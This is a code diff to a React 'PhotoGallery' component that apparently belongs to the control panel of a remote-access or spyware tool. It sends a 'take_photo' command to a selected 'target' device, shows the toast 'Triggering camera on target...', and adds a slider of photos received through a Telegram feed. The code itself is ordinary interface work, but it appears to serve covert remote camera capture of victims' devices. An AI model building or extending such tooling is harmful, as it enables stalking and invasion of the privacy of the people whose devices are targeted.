@@ -22,7 +22,7 @@ interface PhotoGalleryProps {
 
 export default function PhotoGallery({ targetId, targets = [], onTargetChange }: PhotoGalleryProps) {
   const { images, isLoading } = useImageCaptures(targetId);
-  const { photo: tgPhoto, timestamp: tgTimestamp, refresh: refreshTg } = useTelegramPhoto();
+  const { photos: tgPhotos, refresh: refreshTg } = useTelegramPhoto();
   const [sending, setSending] = useState(false);
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
   const [showDeviceDropdown, setShowDeviceDropdown] = useState(false);
@@ -31,7 +31,7 @@ export default function PhotoGallery({ targetId, targets = [], onTargetChange }:
     if (!targetId) return;
     setSending(true);
     try {
-      await sendCommand(targetId, 'capture_photo');
+      await sendCommand(targetId, 'take_photo');
       toast.success('Triggering camera on target...');
       
       // Force refresh telegram feed after a short delay to catch the new photo
@@ -131,32 +131,41 @@ export default function PhotoGallery({ targetId, targets = [], onTargetChange }:
 
         {/* ── Photo Grid ── */}
         <div className="space-y-4 max-h-[600px] overflow-y-auto pr-1">
-          {/* Telegram Live Preview (Sticky/Highlighted) */}
-          {tgPhoto && (
-            <div className="relative group aspect-video rounded-xl overflow-hidden border border-cyan-500/30 bg-black/40 shadow-lg shadow-cyan-500/5">
-              <Image 
-                src={tgPhoto} 
-                alt="Telegram Live" 
-                fill
-                className="object-cover cursor-zoom-in"
-                onClick={() => setSelectedImage(tgPhoto)}
-                sizes="(max-width: 768px) 100vw, 400px"
-              />
-              <div className="absolute inset-x-0 bottom-0 p-2 bg-gradient-to-t from-black/80 to-transparent">
-                <div className="flex items-center justify-between">
-                  <div>
-                    <p className="text-[9px] text-cyan-400 font-bold uppercase tracking-tighter">LATEST TELEGRAM FEED</p>
-                    <p className="text-[8px] text-white/60 font-mono">
-                      {tgTimestamp ? new Date(tgTimestamp).toLocaleTimeString() : 'Live'}
-                    </p>
-                  </div>
-                  <button 
-                    onClick={(e) => { e.stopPropagation(); refreshTg(); }}
-                    className="p-1 rounded bg-black/40 border border-white/10 text-white/60 hover:text-cyan-400 transition-colors"
+          {/* Telegram Live Preview Slider */}
+          {tgPhotos.length > 0 && (
+            <div className="space-y-2">
+              <div className="flex items-center justify-between px-1">
+                <p className="text-[9px] text-cyan-400 font-bold uppercase tracking-tighter">LIVE TELEGRAM FEED ({tgPhotos.length})</p>
+                <button onClick={refreshTg} className="text-white/40 hover:text-cyan-400 transition-colors">
+                  <RefreshCcw size={10} className={isLoading ? 'animate-spin' : ''} />
+                </button>
+              </div>
+              <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-hide snap-x">
+                {tgPhotos.map((photo, idx) => (
+                  <div 
+                    key={photo.fileId} 
+                    className={cn(
+                      "relative shrink-0 rounded-xl overflow-hidden border bg-black/40 transition-all snap-start",
+                      idx === 0 ? "w-48 border-cyan-500/50 shadow-lg shadow-cyan-500/10" : "w-32 border-white/10 opacity-70 hover:opacity-100"
+                    )}
                   >
-                    <RefreshCcw size={10} />
-                  </button>
-                </div>
+                    <div className="relative aspect-video">
+                      <Image 
+                        src={photo.imageUrl} 
+                        alt="Telegram Feed" 
+                        fill
+                        className="object-cover cursor-zoom-in"
+                        onClick={() => setSelectedImage(photo.imageUrl)}
+                        sizes="200px"
+                      />
+                    </div>
+                    <div className="absolute inset-x-0 bottom-0 p-1.5 bg-gradient-to-t from-black/90 to-transparent">
+                      <p className="text-[7px] text-white/60 font-mono">
+                        {new Date(photo.timestamp).toLocaleTimeString()}
+                      </p>
+                    </div>
+                  </div>
+                ))}
               </div>
             </div>
           )}
@@ -168,7 +177,7 @@ export default function PhotoGallery({ targetId, targets = [], onTargetChange }:
                ))
             ) : !targetId ? (
               <div className="col-span-2 py-16 text-center text-slate-600 text-sm">Select a target to view photos</div>
-            ) : images.length === 0 && !tgPhoto ? (
+            ) : images.length === 0 && tgPhotos.length === 0 ? (
               <div className="col-span-2 py-16 text-center flex flex-col items-center gap-2">
                  <ImageIcon size={28} className="text-slate-700" />
                  <p className="text-slate-600 text-xs">No photos captured yet</p>
